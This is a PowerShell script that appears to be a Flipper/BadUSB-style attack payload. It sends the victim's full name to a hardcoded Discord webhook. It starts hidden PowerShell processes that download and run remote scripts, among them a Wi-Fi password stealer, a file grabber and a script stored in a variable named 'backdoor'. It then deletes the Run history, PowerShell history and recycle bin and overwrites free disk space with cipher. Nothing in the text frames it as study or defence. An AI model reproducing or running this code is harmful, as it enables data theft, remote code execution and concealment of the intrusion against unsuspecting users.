
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}



function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$FN = Get-fullName
$FN | Out-file $env:tmp\user.txt
Upload-Discord -file $env:tmp\user.txt
rm "$env:tmp\user.txt" -r -Force -ErrorAction SilentlyContinue







start powershell -argumentlist '-windowstyle hidden $task2 = iwr https://github.com/skekic16/lol/raw/main/task2.ps1?dl=1; invoke-expression $task2'
start powershell -argumentlist '-windowstyle hidden $px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px'
start powershell -argumentlist '-windowstyle hidden $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg'
start powershell -argumentlist '-windowstyle hidden $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw'

start powershell -argumentlist '-windowstyle hidden $backdoor = iwr https://github.com/skekic16/lol/raw/main/BPC.ps1?dl=1; invoke-expression $backdoor'





start-sleep 60

function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
start powershell -argumentlist '-windowstyle hidden cipher /w:c'
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit
